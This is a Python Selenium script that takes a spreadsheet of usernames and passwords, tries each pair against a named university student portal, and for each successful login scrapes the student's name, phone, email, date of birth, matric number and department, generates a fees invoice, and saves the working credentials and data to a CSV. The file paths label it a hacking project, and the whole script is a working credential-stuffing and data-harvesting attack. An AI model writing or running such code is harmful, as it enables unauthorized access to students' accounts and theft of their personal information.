import os
import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

def login_and_get_profile_info(username, password):
    chromedriver_path = '/opt/homebrew/bin/chromedriver'
    os.environ['PATH'] += os.pathsep + chromedriver_path

    options = Options()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")

    driver = webdriver.Chrome(options=options)

    try:
        driver.get('https://portal.esut.edu.ng/Login.aspx')

        username_field = driver.find_element(By.ID, 'txtLoginUsername')
        password_field = driver.find_element(By.ID, 'txtLoginPassword')
        login_button = driver.find_element(By.ID, 'btnLogin')

        username_field.send_keys(username)
        password_field.send_keys(password)
        login_button.click()

        if "dashboard" in driver.current_url.lower():
            driver.get('https://portal.esut.edu.ng/modules/ProfileDetails/Biodata.aspx')

            surname_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, 'ContentPlaceHolder1_txtSurname'))
            )
            firstname_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, 'ContentPlaceHolder1_txtFirstname'))
            )
            middlename_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, 'ContentPlaceHolder1_txtMiddlename'))
            )
            phone_number_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, 'ContentPlaceHolder1_wmeMobileno'))
            )
            matric_number_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, 'ContentPlaceHolder1_txtMatricNo'))
            )
            department_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, 'ContentPlaceHolder1_ddlDepartment'))
            )
            email_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, 'ContentPlaceHolder1_txtEmail'))
            )
            date_of_birth_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, 'ContentPlaceHolder1_rdpDateofBirth_input'))
            )

            surname = surname_element.get_attribute('value')
            firstname = firstname_element.get_attribute('value')
            middlename = middlename_element.get_attribute('value')
            phone_number = phone_number_element.get_attribute('value')
            matric_number = matric_number_element.get_attribute('value')
            department = department_element.find_element(By.CSS_SELECTOR, 'option[selected="selected"]').text
            email = email_element.get_attribute('value')
            date_of_birth = date_of_birth_element.get_attribute('value')

            driver.get('https://portal.esut.edu.ng/modules/schoolfees/getinvoice.aspx?idx=SCHF')

            try:
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CLASS_NAME, "swal-button--confirm"))
                ).click()
            except TimeoutException:
                print("Popup not found or already closed.")

            session_dropdown = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, 'ddlSession'))
            )
            session_dropdown.click()
            session_dropdown.find_element(By.XPATH, "//option[@value='26']").click()  # Select 2024-2025

            generate_button = driver.find_element(By.ID, 'Button1')
            generate_button.click()

            try:
                invoice_element = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, 'lblRefNo'))
                )
                invoice_number = invoice_element.text
            except TimeoutException:
                print(f"Invoice number not found for {username}. Skipping...")
                return None

            return {
                'Username': username,
                'Password': password,
                'Surname': surname,
                'Firstname': firstname,
                'Middlename': middlename,
                'Phone': phone_number,
                'MatricNumber': matric_number,
                'Department': department,
                'Email': email,
                'DateOfBirth': date_of_birth,
                'InvoiceNumber': invoice_number
            }
        else:
            print(f"Login failed for {username}. Skipping...")
            return None
    finally:
        driver.quit()

def check_credentials(accounts_df, output_file_path):
    columns = [
        'Username', 'Password', 'Surname', 'Firstname', 'Middlename', 'Phone', 'MatricNumber', 
        'Department', 'Email', 'DateOfBirth', 'InvoiceNumber'
    ]
    
    # Open the output file in append mode
    with open(output_file_path, 'w', newline='', buffering=1) as csvfile:
        # Create the CSV writer
        writer = pd.DataFrame(columns=columns)
        writer.to_csv(csvfile, index=False)  # Write the header initially

        for index, row in accounts_df.iterrows():
            username = row['username']
            password = row['password']

            profile_info = login_and_get_profile_info(username, password)

            if profile_info is not None:
                # Append the valid account's profile info directly to CSV
                profile_info_df = pd.DataFrame([profile_info])
                profile_info_df.to_csv(csvfile, header=False, index=False)
                csvfile.flush()  # Flush after each write to ensure immediate disk write
                print(f"Saved valid account: {username}")

    print("Finished processing all accounts.")

# Specify the full path to your Excel file
excel_file_path = '/Users/azubuike/Downloads/Hack/esuthacking/esuthacking/2022 ENG.xlsx'

# Load the accounts from the Excel file
accounts_df = pd.read_excel(excel_file_path)

# Specify the path where you want to save the valid accounts data as CSV
output_file_path = '/Users/azubuike/Downloads/Hack/esuthacking/esuthacking/2022.csv'

# Check credentials and get valid accounts, saving each one immediately
check_credentials(accounts_df, output_file_path)

print("Finished processing all accounts.")
